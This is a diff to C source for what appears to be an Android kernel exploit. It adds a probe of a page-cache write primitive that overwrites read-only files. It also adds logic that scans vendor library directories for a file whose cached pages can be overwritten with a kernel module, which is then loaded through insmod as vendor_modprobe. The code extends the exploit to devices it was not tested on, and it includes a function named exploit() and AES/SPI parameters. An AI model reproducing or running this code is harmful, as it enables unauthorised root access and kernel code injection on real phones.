@@ -13,6 +13,7 @@
 #include <sys/wait.h>
 #include <sys/stat.h>
 #include <sys/utsname.h>
+#include <dirent.h>
 #include <netinet/in.h>
 #include <arpa/inet.h>
 #include "aes256.h"
@@ -25,6 +26,7 @@ static int      g_sender_port;
 static uint32_t g_spi;
 static uint8_t  g_aes_key[32];
 static uint32_t g_seq = 1;
+static int      g_probe = 0;
 struct PatchRestore {
     const char *lib;
     uint64_t    tramp_aligned;
@@ -343,6 +345,57 @@ static int patch_helper(void) {
     return 0;
 }
 
+/* Minimal runtime probe of the page-cache write primitive. Writes one 16-byte
+ * block into crash_dump64's page cache at offset 16 - exactly the block whose
+ * read-back decides "DEVICE NOT VULNERABLE" in patch_helper() - and verifies it.
+ * On success the original block is written back so the probe leaves no trace.
+ * Returns 0 when the primitive takes effect (device usable), 1 otherwise. */
+static int probe(void) {
+    const size_t off = 16;
+    uint8_t orig[16], desired[16], got[16];
+
+    int vfd = open(kCrashDump, O_RDONLY);
+    if (vfd < 0) {
+        printf("probe: open %s failed: %s\n", kCrashDump, strerror(errno));
+        printf("PROBE FAILED\n");
+        return 1;
+    }
+    ssize_t n = pread(vfd, orig, sizeof(orig), (off_t)off);
+    close(vfd);
+    if (n != 16) {
+        printf("probe: read original failed (%zd)\n", n);
+        printf("PROBE FAILED\n");
+        return 1;
+    }
+
+    for (int i = 0; i < 16; i++) desired[i] = (uint8_t)(0xA5 ^ (i * 7));
+    if (memcmp(orig, desired, 16) == 0) desired[0] ^= 0xFF;
+
+    printf("=== probe: page-cache write primitive ===\n");
+    if (patch_file_cbc(kCrashDump, (char *)desired, 16, off, 0) != 0) {
+        printf("probe: write failed\n");
+        printf("PROBE FAILED\n");
+        return 1;
+    }
+
+    vfd = open(kCrashDump, O_RDONLY);
+    n = (vfd >= 0) ? pread(vfd, got, sizeof(got), (off_t)off) : -1;
+    if (vfd >= 0) close(vfd);
+
+    if (n != 16 || memcmp(got, desired, 16) != 0) {
+        printf("probe: read-back mismatch\n");
+        printf("PROBE FAILED\n");
+        return 1;
+    }
+    printf("probe: read-back matches\n");
+
+    if (patch_file_cbc(kCrashDump, (char *)orig, 16, off, 0) != 0)
+        printf("probe: restore failed (page cache only, cleared on reboot)\n");
+
+    printf("PROBE OK\n");
+    return 0;
+}
+
 static int patch_ko(void) {
     int andr = 0, major = 0, minor = 0;
     if (read_device_versions(&andr, &major, &minor) != 0) {
@@ -354,6 +407,11 @@ static int patch_ko(void) {
     }
     printf("Using KMI: android%d-%d.%d\n",
              ko->android_release, ko->kver_major, ko->kver_minor);
+
+    if (libcxx_ko_target[0] == '\0') {
+        printf("patch: no KO staging file - cannot deliver the module\n");
+        return -1;
+    }
 
     size_t len;
     char *buf = pad16(ko->start, (size_t)(ko->end - ko->start), &len);
@@ -451,17 +509,82 @@ static int createOrphanProcess(void) {
     return 0;
 }
 
-static const char *detect_ko_target(void) {
-    static const char *const candidates[] = {
-        "/vendor/lib64/libbinderdebug.so",
-        "/vendor/lib64/libstagefrighthw.so",
-        "/vendor/lib64/libstagefright_aidl_bufferpool2.so",
-    };
-    for (size_t i = 0; i < sizeof(candidates) / sizeof(candidates[0]); i++) {
-        if (access(candidates[i], F_OK) == 0)
-            return candidates[i];
+/* ---- KO staging file selection -------------------------------------------
+ * The module is delivered by overwriting the page cache of a read-only vendor
+ * file and then running `insmod <that file>` as vendor_modprobe. Any vendor
+ * file vendor_modprobe can read and that is at least as large as the padded KO
+ * works, so the names do not matter - only that the file exists on this device.
+ * Older builds hardcoded three Samsung paths and fell back to a non-existent
+ * one, which made every other device fail before it even got patched.
+ *
+ * Selection order:
+ *   1. the known-good targets (proven on the devices this project was tested
+ *      on), so tested hardware keeps its exact previous behaviour;
+ *   2. otherwise the best match found by scanning the vendor lib dirs.
+ */
+#define KO_TARGET_MAX_CHARS 63          /* libcxx.S reserves 64 bytes (incl NUL) */
+
+/* Largest bundled KO pads to ~12 KB; 64 KB leaves headroom and is still far
+ * below the size of any real vendor library. */
+#define KO_STAGING_MIN_BYTES (64 * 1024)
+
+static const char *const kKnownKoTargets[] = {
+    "/vendor/lib64/libbinderdebug.so",
+    "/vendor/lib64/libstagefrighthw.so",
+    "/vendor/lib64/libstagefright_aidl_bufferpool2.so",
+};
+
+/* Scanned in order. /vendor/lib64 first: it exists on every GKI device. */
+static const char *const kKoScanDirs[] = {
+    "/vendor/lib64",
+    "/odm/lib64",
+    "/system/vendor/lib64",
+    "/vendor/lib",
+};
+
+static int has_suffix(const char *s, const char *suffix) {
+    size_t ls = strlen(s), lf = strlen(suffix);
+    return ls >= lf && strcmp(s + ls - lf, suffix) == 0;
+}
+
+/* Scan the vendor lib dirs for a `.so` that is a regular file, fits the path
+ * buffer and is large enough to hold the KO. The largest such file wins (ties
+ * broken by name) so the pick is stable across runs. Returns a pointer to a
+ * static buffer, or NULL when nothing qualifies. */
+static const char *scan_ko_target(void) {
+    static char best[KO_TARGET_MAX_CHARS + 1];
+    off_t best_size = 0;
+    best[0] = '\0';
+
+    for (size_t d = 0; d < sizeof(kKoScanDirs) / sizeof(kKoScanDirs[0]); d++) {
+        DIR *dir = opendir(kKoScanDirs[d]);
+        if (!dir) continue;
+        struct dirent *ent;
+        while ((ent = readdir(dir)) != NULL) {
+            if (!has_suffix(ent->d_name, ".so")) continue;
+            char path[KO_TARGET_MAX_CHARS + 1];
+            int n = snprintf(path, sizeof(path), "%s/%s", kKoScanDirs[d], ent->d_name);
+            if (n <= 0 || n > KO_TARGET_MAX_CHARS) continue;
+            struct stat st;
+            if (stat(path, &st) != 0 || !S_ISREG(st.st_mode)) continue;
+            if (st.st_size < (off_t)KO_STAGING_MIN_BYTES) continue;
+            if (st.st_size > best_size
+                    || (st.st_size == best_size && strcmp(path, best) > 0)) {
+                best_size = st.st_size;
+                strcpy(best, path);
+            }
+        }
+        closedir(dir);
     }
-    return candidates[0];
+    return best[0] ? best : NULL;
+}
+
+static const char *detect_ko_target(void) {
+    for (size_t i = 0; i < sizeof(kKnownKoTargets) / sizeof(kKnownKoTargets[0]); i++) {
+        if (access(kKnownKoTargets[i], F_OK) == 0)
+            return kKnownKoTargets[i];
+    }
+    return scan_ko_target();
 }
 
 static int hex_to_bytes(const char *hex, uint8_t *out, size_t len) {
@@ -495,6 +618,8 @@ static int setup(int argc, char **argv) {
             spi = (uint32_t)strtoul(argv[++i], NULL, 0);
         else if (!strcmp(a, "--aes-key") && i + 1 < argc)
             have_aes = hex_to_bytes(argv[++i], aes_key, sizeof(aes_key)) == 0;
+        else if (!strcmp(a, "--probe"))
+            g_probe = 1;
         else { usage(argv[0]); return 2; }
     }
     if (!encap_port || !sender_port || !spi || !have_aes) {
@@ -509,11 +634,19 @@ static int setup(int argc, char **argv) {
 
     const char *ko_target = detect_ko_target();
     libcxx_ko_target = libcxx_data + libcxx_ko_target_off;
-    strncpy(libcxx_ko_target, ko_target, 63);
-    libcxx_ko_target[63] = '\0';
+    if (ko_target) {
+        strncpy(libcxx_ko_target, ko_target, 63);
+        libcxx_ko_target[63] = '\0';
+    } else {
+        libcxx_ko_target[0] = '\0';
+    }
 
     printf("=== setup ===\n");
-    printf("found ko_target: %s\n", ko_target);
+    if (ko_target)
+        printf("found ko_target: %s\n", ko_target);
+    else
+        printf("no ko_target: no vendor lib >= %d KB under the scan dirs\n",
+                 KO_STAGING_MIN_BYTES / 1024);
     printf("encap port: %d\n", encap_port);
     printf("spi: 0x%x\n", spi);
     return 0;
@@ -577,6 +710,7 @@ done:
 int main(int argc, char **argv) {
     setvbuf(stdout, NULL, _IONBF, 0);
     if (setup(argc, argv) != 0) return 2;
+    if (g_probe) return probe();
     int rc = exploit();
     cleanup();
     return rc;
